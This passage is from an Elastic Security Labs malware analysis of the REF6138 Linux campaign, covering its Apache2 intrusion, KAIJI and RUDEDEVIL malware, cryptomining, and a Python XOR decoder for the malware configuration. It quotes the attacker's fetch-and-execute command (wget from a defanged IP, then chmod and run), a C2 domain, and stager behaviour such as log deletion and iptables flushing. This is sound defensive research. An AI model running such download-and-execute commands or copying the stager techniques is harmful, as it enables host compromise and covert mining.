<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>Betting on Bots: Investigating Linux malware, crypto mining, and gambling API abuse — Elastic Security Labs</title><meta name="description" content="The REF6138 campaign involved cryptomining, DDoS attacks, and potential money laundering via gambling APIs, highlighting the attackers&#x27; use of evolving malware and stealthy communication channels."/><meta property="og:title" content="Betting on Bots: Investigating Linux malware, crypto mining, and gambling API abuse — Elastic Security Labs"/><meta property="og:description" content="The REF6138 campaign involved cryptomining, DDoS attacks, and potential money laundering via gambling APIs, highlighting the attackers&#x27; use of evolving malware and stealthy communication channels."/><meta property="og:image" content="https://www.elastic.co/security-labs/assets/images/betting-on-bots/betting-on-bots.jpg?bf831972198f6e1a6adc298587dbcf9a"/><meta property="og:image:alt" content="The REF6138 campaign involved cryptomining, DDoS attacks, and potential money laundering via gambling APIs, highlighting the attackers&#x27; use of evolving malware and stealthy communication channels."/><meta property="og:site_name"/><meta property="og:url" content="https://www.elastic.co/security-labs/betting-on-bots"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Betting on Bots: Investigating Linux malware, crypto mining, and gambling API abuse — Elastic Security Labs"/><meta name="twitter:description" content="The REF6138 campaign involved cryptomining, DDoS attacks, and potential money laundering via gambling APIs, highlighting the attackers&#x27; use of evolving malware and stealthy communication channels."/><meta name="twitter:image" content="https://www.elastic.co/security-labs/assets/images/betting-on-bots/betting-on-bots.jpg?bf831972198f6e1a6adc298587dbcf9a"/><meta name="twitter:image:alt" content="The REF6138 campaign involved cryptomining, DDoS attacks, and potential money laundering via gambling APIs, highlighting the attackers&#x27; use of evolving malware and stealthy communication channels."/><link rel="canonical" href="https://www.elastic.co/security-labs/betting-on-bots"/><link rel="preload" href="/security-labs/logo.svg" as="image" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=3840&amp;q=75 3840w" imageSizes="100vw" fetchpriority="high"/><meta name="next-head-count" content="19"/><script src="https://play.vidyard.com/embed/v4.js" type="text/javascript" async=""></script><link rel="icon" href="/security-labs/favicon.svg"/><link rel="mask-icon" href="/security-labs/favicon.svg" color="#1C1E23"/><link rel="apple-touch-icon" href="/security-labs/favicon.svg"/><meta name="theme-color" content="#1C1E23"/><link rel="preload" href="/security-labs/_next/static/media/6d93bde91c0c2823-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/369c6e283c5acc6e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/92f44bb82993d879-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/ee71530a747ff30b-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/9fac010bc1f02be0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/cbf5fbad4d73afac-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><script id="google-tag-manager" data-nscript="beforeInteractive">
          (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
          'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
          })(window,document,'script','dataLayer','GTM-KNJMG2M');
          </script><link rel="preload" href="/security-labs/_next/static/css/265ed7605fd03477.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/265ed7605fd03477.css" data-n-g=""/><link rel="preload" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/security-labs/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/security-labs/_next/static/chunks/webpack-7987c6fda769d510.js" defer=""></script><script src="/security-labs/_next/static/chunks/framework-7a7e500878b44665.js" defer=""></script><script src="/security-labs/_next/static/chunks/main-ebd33a9f1cae5951.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/_app-cb8664d1d3df2511.js" defer=""></script><script src="/security-labs/_next/static/chunks/fec483df-43ee602fabdfe3a4.js" defer=""></script><script src="/security-labs/_next/static/chunks/877-34f408271ef44c22.js" defer=""></script><script src="/security-labs/_next/static/chunks/511-d08fe0fdd6f8a984.js" defer=""></script><script src="/security-labs/_next/static/chunks/683-a5053c37fe5bd0c9.js" defer=""></script><script src="/security-labs/_next/static/chunks/402-791da5e634930df4.js" defer=""></script><script src="/security-labs/_next/static/chunks/616-0b017b9cfa597392.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/%5Bslug%5D-3d74e9a05863bcfd.js" defer=""></script><script src="/security-labs/_next/static/dGrrQfBbQkqaleQ_11aBK/_buildManifest.js" defer=""></script><script src="/security-labs/_next/static/dGrrQfBbQkqaleQ_11aBK/_ssgManifest.js" defer=""></script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNJMG2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><main class="__variable_0351a5 __variable_1f211e __variable_a5b5f5 flex flex-col min-h-screen"><div class="scroll-percentage-container"><div class="scroll-percentage-bar" style="width:0%"></div></div><nav class="fixed w-full z-40" data-headlessui-state=""><div class="bg-gradient-to-b from-zinc-900 from-20% h-[200%] to-transparent absolute inset-0 z-0 pointer-events-none"></div><div class="container relative z-10"><div class="flex h-16 items-center justify-between"><div class="flex items-center justify-start w-full"><div><a class="hover:opacity-50 transition" href="/security-labs"><img alt="elastic security labs logo" fetchpriority="high" width="200" height="30" decoding="async" data-nimg="1" style="color:transparent" src="/security-labs/logo.svg"/></a></div><div class="hidden lg:ml-6 lg:block"><div class="flex space-x-4"><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/about"><span>About</span></a><div class="relative" data-headlessui-state=""><div><button class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" id="headlessui-menu-button-:R2kpm:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state="">Topics<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-1 -mr-1 h-4 w-4 text-zinc-400 relative top-[1px]"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"></path></svg></button></div></div><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/vulnerability-updates"><span>Vulnerability updates</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/reports"><span>Reports</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/tools"><span>Tools</span></a></div></div><div class="hidden lg:ml-auto lg:block"><div class="flex items-center space-x-4"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/betting-on-bots"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="https://www.elastic.co/security-labs/rss/feed.xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-4 w-4 mr-1"><path d="M3.75 3a.75.75 0 00-.75.75v.5c0 .414.336.75.75.75H4c6.075 0 11 4.925 11 11v.25c0 .414.336.75.75.75h.5a.75.75 0 00.75-.75V16C17 8.82 11.18 3 4 3h-.25z"></path><path d="M3 8.75A.75.75 0 013.75 8H4a8 8 0 018 8v.25a.75.75 0 01-.75.75h-.5a.75.75 0 01-.75-.75V16a6 6 0 00-6-6h-.25A.75.75 0 013 9.25v-.5zM7 15a2 2 0 11-4 0 2 2 0 014 0z"></path></svg><span class="hidden xl:block">Subscribe</span></a><a class="font-display inline-flex items-center justify-center rounded font-semibold disabled:!select-none disabled:!bg-gray-400 bg-blue-600 text-white hover:bg-blue-500 enabled:hover:text-white/80 transition-colors px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://cloud.elastic.co/registration?cta=cloud-registration&amp;tech=trial&amp;plcmt=navigation&amp;pg=security-labs">Start free trial</a><a class="font-display inline-flex items-center justify-center rounded font-semibold text-white disabled:!select-none disabled:!bg-gray-400 button px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://www.elastic.co/contact">Contact sales</a></div></div></div><div class="-mr-2 flex lg:hidden"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/betting-on-bots"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white" id="headlessui-disclosure-button-:R59m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open navigation menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><main class="mb-20 flex-1 flex flex-col"><div class="h-48 md:h-64"><div class="after:absolute after:block after:bg-blue-400 after:blur-3xl after:content-[&#x27; &#x27;] after:h-96 after:opacity-5 after:right-0 after:rounded-full after:top-20 after:w-1/2 after:z-0 before:absolute before:block before:blur-3xl before:bg-orange-400 before:content-[&#x27; &#x27;] before:h-96 before:left-0 before:opacity-5 before:rounded-full before:w-1/2 before:z-0 w-full h-full relative"><div class="relative z-10 w-full h-[125%] -top-[25%] bg-no-repeat bg-cover bg-bottom flex items-center justify-center" style="background-image:url(/security-labs/grid.svg)"></div></div></div><article class="px-4"><div class="max-w-7xl mx-auto relative z-10 flex flex-col space-y-4"><div class="eyebrow break-words"><time class="block mb-2 md:mb-0 md:inline-block article-published-date" dateTime="2024-09-27T00:00:00.000Z">27 September 2024</time><span class="hidden md:inline-block md:mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/remco-sprooten">Remco Sprooten</a><span class="mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/ruben-groenewoud">Ruben Groenewoud</a></div><h1 class="font-bold leading-tighter text-3xl md:text-5xl"><span>Betting on Bots: Investigating Linux malware, crypto mining, and gambling API&nbsp;abuse</span></h1><p class="text-zinc-200 text-base md:text-xl">The REF6138 campaign involved cryptomining, DDoS attacks, and potential money laundering via gambling APIs, highlighting the attackers&#x27; use of evolving malware and stealthy communication channels.</p><div class="flex items-center mt-4 text-zinc-200 text-sm space-x-4 border-t border-white/25 pt-4"><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>80 min read</span></span><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M9.568 3H5.25A2.25 2.25 0 003 5.25v4.318c0 .597.237 1.17.659 1.591l9.581 9.581c.699.699 1.78.872 2.607.33a18.095 18.095 0 005.223-5.223c.542-.827.369-1.908-.33-2.607L11.16 3.66A2.25 2.25 0 009.568 3z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M6 6h.008v.008H6V6z"></path></svg><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/malware-analysis">Malware analysis</a>, </span><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/attack-pattern">Attack pattern</a></span></span></div></div><div class="max-w-7xl mx-auto"><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 sm:p-8 md:p-10 rounded-3xl mt-5 md:mt-10"><div class="relative w-full rounded-lg overflow-hidden aspect-video"><img alt="Betting on Bots: Investigating Linux malware, crypto mining, and gambling API abuse" fetchpriority="high" decoding="async" data-nimg="fill" class="object-cover absolute h-full w-full" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" srcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=3840&amp;q=75 3840w" src="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbetting-on-bots%2Fbetting-on-bots.jpg&amp;w=3840&amp;q=75"/><div class="absolute border border-white/50 inset-0 mix-blend-overlay rounded-lg z-10"></div></div></div></div><div class="lg:max-w-7xl mx-auto relative mt-12 lg:grid lg:grid-cols-4 lg:gap-8 items-start"><div class="flex justify-center lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><h2 class="font-bold text-2xl md:text-4xl relative"><span id="introduction" class="absolute -top-32"></span>Introduction</h2>
<p>In recent months, Elastic Security Labs has uncovered a sophisticated Linux malware campaign targeting vulnerable servers. The attackers initiated the compromise in March 2024 by exploiting an Apache2 web server. Gaining initial access the threat actors deployed a complex intrusion set to establish persistence and expand their control over the compromised host.</p>
<p>The threat actors utilized a mixture of tools and malware, including C2 channels disguised as kernel processes, telegram bots for communication, and cron jobs for scheduled task execution. Notably, they deployed multiple malware families, such as KAIJI and RUDEDEVIL, alongside custom-written malware. KAIJI, known for its DDoS capabilities, and RUDEDEVIL, a cryptocurrency miner, were used to exploit system resources for malicious purposes.</p>
<p>Our investigation revealed a potential Bitcoin/XMR mining scheme that leverages gambling APIs, suggesting the attackers might be conducting money laundering activities using compromised hosts. We also gained access to a file share that hosted daily uploads of fresh KAIJI samples with previously unseen hashes, indicating active development and adaptation by the malware authors.</p>
<p>This research publication delves into the details of the campaign, providing a comprehensive analysis of the attackers&#x27; tactics, techniques, and procedures. We explore how they established initial access, the methods used for persistence and privilege escalation, and the malware deployed at each stage. Additionally, we discuss the command and control infrastructure, including the use of GSOCKET and Telegram for stealthy communication.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="execution-flow" class="absolute -top-32"></span>Execution flow</h2>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="initial-access" class="absolute -top-32"></span>Initial access</h3>
<p>Our team observed a host that was initially compromised in March 2024 by obtaining arbitrary code execution on a server running Apache2. Evidence of this compromise is seen in the execution of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">id</code> command via the Apache2 process, after which we see the threat actor exploiting the web server and deploying KAIJI malware under the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">www-data</code> user account.</p>
<p>Shortly after the Kaiji deployment, the attacker used the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">www-data</code> account to download a script named <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">00.sh</code> from the URL <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">http://61.160.194[.]160:35130</code>, which, after further investigation, also hosted several versions of RUDEDEVIL malware.</p>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">00.sh</code> is a stager that:</p>
<ul>
<li>Sets its default shell and PATH.</li>
<li>Deletes several log files to erase traces of execution.</li>
<li>Leverages <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ps</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">netstat</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">lsof</code> and a list of common mining process names to kill any potential mining competition on the compromised host.</li>
<li>Flushes the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">iptables</code> rules on the host, sets several <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">iptables</code> rules to block connections to specific destination ports and mining pools, and disables <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">iptables</code>.</li>
<li>Finally, a second stage (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sss6</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sss68</code>) is downloaded and executed, and execution traces are erased.</li>
</ul>
<p>The figure below shows a compressed version of the stager. Lines annotated with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[...]</code> are shortened to enhance readability.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="fileserver" class="absolute -top-32"></span>Fileserver</h3>
<p>Via the backdoored web server process, the attacker downloaded and executed malware through the following command:</p>
<pre><code>sh -c wget http://107.178.101[.]245:5488/l64;chmod 777 l64;./l64;rm -r l64;wget http://107.178.101[.]245:5488/l86;chmod 777 l86;./l86;rm -r l86</code></pre>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">l64</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">l86</code> files are downloaded from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">http://107.178.101[.]245:5488</code>, after which they are granted all permissions, executed, and removed. Looking at the server that is hosting these malware samples, we see the following:</p>
<p></p>
<p>This seems to be a file server, hosting several types of malware for different architectures. The file server leverages the Rejetto technology. These malwares have upload dates and download counters. For example, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">download.sh</code> file that was uploaded September 10th, was already downloaded 3,100 times.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="rudedevillucifer" class="absolute -top-32"></span>RUDEDEVIL/LUCIFER</h3>
<p>Upon closer inspection, the file <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sss6</code>, which was downloaded and executed, has been identified as the RUDEDEVIL malware. Early in the execution process, we encounter an embedded message characteristic of this malware family:</p>
<p></p>
<pre><code>Hi, man. I\&#x27;ve seen several organizations report my Trojan recently, 
Please let me go. I want to buy a car. That\&#x27;s all. I don\&#x27;t want to hurt others. 
I can\&#x27;t help it. My family is very poor. In China, it\&#x27;s hard to buy a suite. 
I don\&#x27;t have any accommodation. I don\&#x27;t want to do anything illegal. 
Really, really, interested, you can give me XmR, my address is 42cjpfp1jJ6pxv4cbjxbbrmhp9yuzsxh6v5kevp7xzngklnutnzqvu9bhxsqbemstvdwymnsysietq5vubezyfoq4ft4ptc, 
thank yo</code></pre>
<p>We note that the files <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">l64</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">l86</code> that are hosted on the file server contain the same malware. When analyzing the execution flow of the malware we see that the main function of the malware performs several key tasks:</p>
<ul>
<li><strong>Daemon Initialization:</strong> The process is converted into a daemon using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">daemon(1, 0)</code>.</li>
<li><strong>Socket Creation:</strong> A socket is created and bound to a specific port.</li>
<li><strong>Signal Handling:</strong> Custom signal handlers are set up for various signals.</li>
<li><strong>Service Initialization:</strong> Several services are started using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SetFILE</code>.</li>
<li><strong>Privilege Handling:</strong> It checks for root privileges and adjusts resource limits accordingly.</li>
<li><strong>Decryption:</strong> The malware decrypts its configuration blobs.</li>
<li><strong>Thread Creation:</strong> Multiple threads are spawned for tasks like mining, killing processes, and monitoring network and CPU usage.</li>
<li><strong>Main Loop:</strong> The program enters an infinite loop where it repeatedly connects to a server and sleeps for a specified duration.</li>
</ul>
<p>When examining the encryption routine, we find it utilizes XOR-based encoding:</p>
<p></p>
<p>To decode the contents statically, we developed a basic Python snippet:</p>
<pre><code>def DecryptData(data_block, encryption_key):
   key_modifier = encryption_key &amp; 0xFF
   key_index = key_modifier // 0x5F  # 0x5F = 95 in decimal
   modifier = (key_modifier - (key_index * 0x5F)) + 0x58  # 0x58 = 88 in decimal

   for i in range(len(data_block)):
       data_block[i] ^= modifier
       data_block[i] &amp;= 0xFF  # Ensure 8-bit value
       data_block[i] += modifier
       data_block[i] &amp;= 0xFF  # Ensure 8-bit value

   return data_block

# Encoded data as hex strings
encoded_data = [
   &#x27;4c494356515049490c467978&#x27;,
   &#x27;0d4f1e4342405142454d0b42534e380f0f5145424f0c53034e4f4f4a0c4f40573801393939391e0d451e020141303727222026254f252d372643400706314955032a593330233237587951215553552d464c0101414939514401515258414324273340254756564741404207004122782d50475555412d503106394d4c34554e48513926352054362a1e0d4e1e20&#x27;,
   &#x27;0f424d4e0f435536575649484b&#x27;,
   &#x27;5642424e380f0f5654430c42014a494c45460c534f4d38070602050f435352434356544b&#x27;,
]

encryption_key = 0x03FF  # 1023 in decimal

# Process and decrypt each encoded data string
for data in encoded_data:
   # Convert hex string to list of integers
   data_bytes = bytes.fromhex(data)
   data_block = list(data_bytes)

   # Decrypt the data
   decrypted_block = DecryptData(data_block, encryption_key)

   # Convert decrypted data back to bytes
   decrypted_bytes = bytes(decrypted_block)
   print(&quot;Decrypted text:&quot;, decrypted_bytes.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))</code></pre>
<p>After decoding the configuration, the following values are revealed:</p>
<ul>
<li>The first value C2 domain <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nishabii[.]xyz</code>.</li>
<li>The second value reveals options that will be passed to XMRIG.</li>
<li>The third value shows the temp file location the malware uses.</li>
<li>The fourth and last string shows the download location for the XMRIG binary.</li>
</ul>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="thread-management-in-the-malware" class="absolute -top-32"></span>Thread Management in the Malware</h3>
<p>The malware initiates several threads to handle its core operations. Let’s explore how some of these functions work in detail.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="understanding-the-killpid-function" class="absolute -top-32"></span>Understanding the KillPid Function</h4>
<p>One of the threads runs the KillPid function, which is designed to continuously monitor and manage processes. The function begins by detaching its current thread, allowing it to run in the background without blocking other processes. It then enters an infinite loop, repeatedly executing its tasks.</p>
<p>At the heart of its functionality is an array called <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sb_name</code>, which contains the names of processes the malware wants to terminate.</p>
<p></p>
<p>Every two seconds, the function checks the system for processes listed in this array, retrieving their process IDs (PIDs) using a helper function called <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">getPidByName</code>. After each iteration, it moves to the next process in the list, ensuring all processes in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sb_name</code> are handled.</p>
<p>Interestingly, after processing all elements in the array, the function enters an extended sleep for 600 seconds — roughly 10 minutes — before resuming its process checks. This extended sleep period is likely implemented to conserve system resources, ensuring the malware doesn&#x27;t consume too much CPU time while monitoring processes.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="understanding-the-get_net_messages-function" class="absolute -top-32"></span>Understanding the Get_Net_Messages Function</h4>
